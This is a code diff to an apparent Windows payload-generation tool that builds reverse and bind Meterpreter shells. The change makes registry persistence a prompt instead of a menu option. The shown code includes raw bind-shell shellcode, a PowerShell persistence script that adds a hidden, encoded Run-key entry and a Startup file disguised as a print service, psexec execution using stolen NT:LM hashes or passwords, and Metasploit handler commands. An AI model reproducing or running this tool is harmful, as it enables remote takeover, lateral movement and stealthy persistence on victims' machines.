@@ -41,18 +41,19 @@ def ServePayload(payloaddirectory):
         print t.bold_red + '\n[*] WebServer Shutdown' + t.normal
 
 
-def ServePsexec(payloaddirectory,targethash,targetusername,targetdomain,targetipaddr,targetpassword):
+def ServePsexec(payloaddirectory, targethash, targetusername, targetdomain, targetipaddr, targetpassword):
     try:
         command = ''
         path = ''
         exeFile = payloaddirectory
         copyFile = ''
-        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols = None,username = targetusername,hashes = targethash,domain = targetdomain,password = targetpassword,aesKey = None,doKerberos = False)
+        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
+                               hashes=targethash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
         print t.bold_green + '\n [*] Starting Psexec....' + t.normal
         time.sleep(20)
         PSEXEC.run(targetipaddr)
     except Exception as E:
-        print t.bold_red + '\n[*] Canceled Psexec!'
+        print t.bold_red + '\n[*] Psexec Error!'
         print E
         print '\n[*] Psexec May Have Worked' + t.normal
 
@@ -185,7 +186,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n'
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n'
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -203,15 +204,13 @@ print t.normal + '=' * t.width
 
 try:
     print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
-           t.bold_red + ' [Shellter]').center(t.width - 15) + t.normal
+           t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
     print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-           ' [Shellter, UacBypass, Priv Esc Checks]').center(t.width + 15) + t.normal
+           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
     print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-           ' [Shellter, UacBypass, Priv Esc Checks]').center(t.width + 13) + t.normal
+           ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
     print ('[4] Windows Reverse Meterpreter' + t.bold_green + '(Raw Shellcode)' +
-           t.bold_red + ' [Base64 Encode]').center(t.width - 1) + t.normal
-    print ('[5] Windows Reverse Meterpreter' + t.bold_green + '(Registry Persistence)' +
-           t.bold_red + ' [Shellter]').center(t.width + 1) + t.normal
+           t.bold_red + ' [Base64 Encode]').center(t.width - 30) + t.normal
     print '=' * t.width
 
     while True:
@@ -231,10 +230,6 @@ try:
         elif menuchoice == '4':
             payloadchoice = windows_met_rev_shell
             payload = 'Windows Meterpreter Reverse Raw '
-            break
-        elif menuchoice == '5':
-            payloadchoice = windows_met_rev_shell
-            payload = 'Windows Meterpreter Reverse Persistence '
             break
         else:
             print t.bold_red + '[*] Wrong Selection' + t.normal
@@ -291,6 +286,9 @@ try:
         if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
             want_ALLCHECKS = raw_input(
                 t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
+        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '' and want_ALLCHECKS.lower() == 'n' or want_ALLCHECKS.lower() == '':
+            want_PERSISTENCE = raw_input(
+                t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
 
     for byte in shellcode:
         ez2read_shellcode += '\\x%s' % byte.encode('hex')
@@ -331,7 +329,7 @@ try:
         persistencelayout)
     persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
 
-    if menuchoice == '5':
+    if want_PERSISTENCE.lower() == 'y':
         with open('persist.ps1', 'w') as persistfile:
             persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
                               base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
@@ -434,14 +432,16 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         while True:
-            targethash = raw_input('[*] Targets NT:LM Hash or Plain Text Password:')
+            targethash = raw_input(
+                '[*] Targets NT:LM Hash or Plain Text Password:')
             targetusername = raw_input('[*] Targets Username:')
             targetdomain = raw_input('[*] Targets Domain:')
             targetipaddr = raw_input('[*] Targets Ip Address:')
-            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' +targetipaddr + t.normal
-            ispsexecdetailscorrect = raw_input('[*] Are These Details Correct? ([y]/n)')
+            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
+            ispsexecdetailscorrect = raw_input(
+                '[*] Are These Details Correct? ([y]/n)')
             if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
-                if re.search(':',targethash):
+                if re.search(':', targethash):
                     print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
                     targetpassword = ''
                 else:
@@ -452,7 +452,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             else:
                 continue
         b = multiprocessing.Process(
-            target=ServePsexec, args=(payloaddir + '/payload.exe',targethash,targetusername,targetdomain,targetipaddr,targetpassword))
+            target=ServePsexec, args=(payloaddir + '/payload.exe', targethash, targetusername, targetdomain, targetipaddr, targetpassword))
         b.daemon = True
         b.start()
 
@@ -463,6 +463,8 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (portnum, portnum + 1))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+        elif want_PERSISTENCE.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
         else:
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;exploit -j\'' % portnum)
     elif menuchoice == '3':
@@ -472,8 +474,6 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
         else:
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
-    elif menuchoice == '5':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
 
     print t.bold_green + '[*] Cleaning Up\n' + t.normal
     subprocess.call(['rm *.rc'], shell=True,
